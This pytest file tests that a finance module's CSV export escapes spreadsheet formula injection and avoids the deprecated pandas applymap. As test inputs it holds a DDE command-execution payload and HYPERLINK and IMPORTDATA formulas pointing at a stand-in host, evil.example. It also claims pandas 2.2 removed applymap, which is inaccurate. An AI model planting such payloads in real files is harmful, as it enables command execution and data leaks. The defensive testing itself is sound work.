"""
Security regression tests for the two fixes mentioned in the public write-up:

  1. CSV formula injection in gl_export_df() — provider/team/workload values
     that start with =, +, -, or @ must be prefixed with a single quote so
     spreadsheet apps (Excel, Google Sheets) do not execute them as formulas.

  2. pandas 2.2 removed .applymap(); the variance table must use .map() instead
     and must not raise AttributeError on the current installed pandas version.
"""
from __future__ import annotations

import io
from datetime import datetime, timedelta

import pandas as pd
import pytest

from src.analytics.finance import gl_export_df, period_summary


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_df(provider="openai", team="eng", workload_class="reason", n=3):
    rows = []
    for i in range(n):
        rows.append({
            "timestamp":      (datetime.utcnow() - timedelta(days=i)).isoformat(),
            "provider":       provider,
            "model":          "gpt-4o",
            "workload_class": workload_class,
            "cost_usd":       1.0 + i * 0.5,
            "is_local":       False,
            "team":           team,
            "input_tokens":   1000,
            "output_tokens":  500,
            "reasoning_tokens": 0,
        })
    return pd.DataFrame(rows)


# ---------------------------------------------------------------------------
# 1. CSV formula injection
# ---------------------------------------------------------------------------

class TestCsvFormulaInjection:
    """
    Any cell value that starts with =, +, -, or @ is a formula injection
    payload when opened in Excel or Google Sheets.  The _safe() guard in
    gl_export_df() must prefix such values with a single quote.
    """

    @pytest.mark.parametrize("evil_prefix", ["=", "+", "-", "@"])
    def test_formula_prefix_in_provider_is_escaped(self, evil_prefix):
        payload = f"{evil_prefix}CMD|' /C calc'!A0"
        df = _make_df(provider=payload)
        gl = gl_export_df(df)
        assert not gl.empty
        for val in gl["provider"]:
            assert val.startswith("'"), (
                f"Provider value {val!r} was not prefixed — formula injection possible"
            )

    @pytest.mark.parametrize("evil_prefix", ["=", "+", "-", "@"])
    def test_formula_prefix_in_team_is_escaped(self, evil_prefix):
        payload = f"{evil_prefix}HYPERLINK(\"http://evil.example\")"
        df = _make_df(team=payload)
        gl = gl_export_df(df)
        assert not gl.empty
        for val in gl["department"]:
            assert val.startswith("'"), (
                f"Department value {val!r} was not prefixed — formula injection possible"
            )

    @pytest.mark.parametrize("evil_prefix", ["=", "+", "-", "@"])
    def test_memo_cell_never_starts_with_formula_prefix(self, evil_prefix):
        """
        The memo cell always starts with 'LLM spend — ' so it is never
        interpreted as a formula by Excel/Sheets — the evil prefix only
        appears mid-string, where it is harmless.  This test verifies that
        the fixed prefix is preserved and the cell itself is not a formula.
        """
        payload = f"{evil_prefix}IMPORTDATA(\"http://evil.example\")"
        df = _make_df(provider=payload)
        gl = gl_export_df(df)
        assert not gl.empty
        for val in gl["memo"]:
            assert val.startswith("LLM spend"), (
                f"Memo {val!r} lost its fixed prefix — cell could now start with a formula char"
            )
            assert not val.startswith(("=", "+", "-", "@")), (
                f"Memo cell {val!r} starts with a formula prefix — Excel would execute it"
            )

    def test_safe_values_are_not_modified(self):
        """Normal values must pass through unchanged — no spurious quoting."""
        df = _make_df(provider="openai", team="eng")
        gl = gl_export_df(df)
        assert not gl.empty
        assert all(v == "openai" for v in gl["provider"])
        assert all(v == "eng" for v in gl["department"])

    def test_csv_bytes_contain_no_bare_formula_prefix(self):
        """
        End-to-end: serialise to CSV bytes (as the download button does) and
        check that no field starts with a raw formula prefix character.
        """
        evil = "=SUM(A1:A100)"
        df = _make_df(provider=evil, team=evil)
        gl = gl_export_df(df)
        csv_text = gl.to_csv(index=False)

        # Parse the CSV and inspect every cell
        reader = pd.read_csv(io.StringIO(csv_text))
        for col in ["provider", "department", "memo"]:
            if col not in reader.columns:
                continue
            for val in reader[col].dropna().astype(str):
                assert not val.startswith(("=", "+", "-", "@")), (
                    f"Column {col!r} contains bare formula prefix in CSV: {val!r}"
                )


# ---------------------------------------------------------------------------
# 2. pandas 2.2 .applymap() removal
# ---------------------------------------------------------------------------

class TestPandasMapCompat:
    """
    pandas 2.2 removed DataFrame.style.applymap() — it must be called as .map().
    Verify that period_summary output can be styled without AttributeError,
    which is what the variance table does before rendering.
    """

    def test_style_map_does_not_raise(self):
        df = _make_df(n=10)
        budgets = [{"team": "eng", "period": "monthly", "amount_usd": 5.0,
                    "alert_threshold": 0.8}]
        summary = period_summary(df, budgets=budgets)
        assert not summary.empty

        def _colour(val: str) -> str:
            colours = {
                "over": "color: red", "at risk": "color: orange",
                "on track": "color: green", "no budget": "color: grey",
            }
            return colours.get(val, "")

        # This is exactly what src/ui/finance.py does — must not raise
        try:
            styled = summary.style.map(_colour, subset=["status"])
            # Render to HTML to force evaluation of the style function
            _ = styled.to_html()
        except AttributeError as exc:
            pytest.fail(
                f"Style API raised AttributeError — likely .applymap() regression: {exc}"
            )

    def test_applymap_is_not_present_in_finance_ui(self):
        """Grep-level guard: the UI file must not contain the removed method name."""
        import pathlib
        src = pathlib.Path("src/ui/finance.py").read_text()
        assert "applymap" not in src, (
            "src/ui/finance.py still calls .applymap() which is removed in pandas 2.2"
        )

    def test_pandas_version_is_22_or_later(self):
        """Confirm the environment actually has pandas 2.2+ so the above tests are meaningful."""
        major, minor = (int(x) for x in pd.__version__.split(".")[:2])
        assert (major, minor) >= (2, 2), (
            f"pandas {pd.__version__} is older than 2.2 — .map() compatibility not exercised"
        )
